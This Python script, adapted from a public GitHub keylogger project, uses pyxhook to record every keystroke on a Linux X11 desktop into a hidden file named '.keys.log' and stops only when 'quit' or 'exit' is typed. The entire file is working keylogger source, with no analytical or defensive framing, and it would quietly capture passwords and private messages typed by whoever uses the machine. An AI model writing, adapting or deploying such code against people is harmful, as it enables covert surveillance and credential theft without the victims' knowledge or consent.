# ADAPTED FROM: https://raw.githubusercontent.com/GiacomoLaw/Keylogger/master/linux/keylogger.py
# import needed modules
import os
from datetime import datetime
import pyxhook

def main():
    # Specify the name of the file (can be changed )
    log_file = f'{os.getcwd()}/.keys.log'
    chars = "    "
    
    # Create a hook manager object
    new_hook = pyxhook.HookManager()
    chars = ["", "", "", ""]

    # The logging function with {event parm}
    def OnKeyPress(event, chars):

        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
            if event.Key == 'P_Enter' :
                f.write('\n')
            else:
                char = chr(event.Ascii)
                f.write(f"{char}")  # Write to the file and convert ascii to readable characters

                chars.pop(0)
                chars.append(char)
                last_four_chars = "".join(c for c in chars)

                if last_four_chars == "quit" or last_four_chars == "exit":
                    new_hook.cancel()

    new_hook.KeyDown = lambda e: OnKeyPress(e, chars)

    new_hook.HookKeyboard()  # set the hook

    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt:
        # User cancelled from command line so close the listener
        new_hook.cancel()
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")


if __name__ == "__main__":
    main()
